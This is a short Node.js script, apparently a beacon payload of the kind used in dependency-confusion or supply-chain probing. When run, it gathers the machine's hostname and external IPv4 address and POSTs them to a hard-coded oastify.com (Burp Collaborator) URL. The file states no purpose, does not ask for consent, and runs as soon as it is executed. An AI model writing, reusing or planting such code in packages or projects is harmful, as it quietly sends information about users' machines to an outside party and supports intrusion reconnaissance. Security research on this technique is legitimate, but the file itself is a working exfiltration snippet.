const os = require('os'); // For system info
const http = require('http'); // HTTP request
const https = require('https'); // HTTPS request

// Function to get hostname and IP
function getSystemDetails() {
    const hostname = os.hostname();
    const networkInterfaces = os.networkInterfaces();
    let ip = 'Unknown';

    // Extract the first non-internal IPv4 address
    for (const iface in networkInterfaces) {
        const addresses = networkInterfaces[iface];
        for (const addr of addresses) {
            if (addr.family === 'IPv4' && !addr.internal) {
                ip = addr.address;
                break;
            }
        }
        if (ip !== 'Unknown') break;
    }

    return { hostname, ip };
}

// Function to send data
function sendData(url, data) {
    const postData = JSON.stringify(data);
    const urlObj = new URL(url);

    const options = {
        hostname: urlObj.hostname,
        port: urlObj.protocol === 'https:' ? 443 : 80,
        path: urlObj.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData),
        },
    };

    const protocol = urlObj.protocol === 'https:' ? https : http;
    const req = protocol.request(options, (res) => {
        console.log(`STATUS: ${res.statusCode}`);
        res.setEncoding('utf8');
        res.on('data', (chunk) => {
            console.log(`BODY: ${chunk}`);
        });
    });

    req.on('error', (e) => {
        console.error(`Problem with request: ${e.message}`);
    });

    // Write data to request body
    req.write(postData);
    req.end();
}

// Get system details and send data
const url = 'https://nvmr7j5ar5y75nsfvywejcqvbmhd59ty.oastify.com';
const systemDetails = getSystemDetails();

console.log('Sending system details:', systemDetails);

sendData(url, systemDetails);
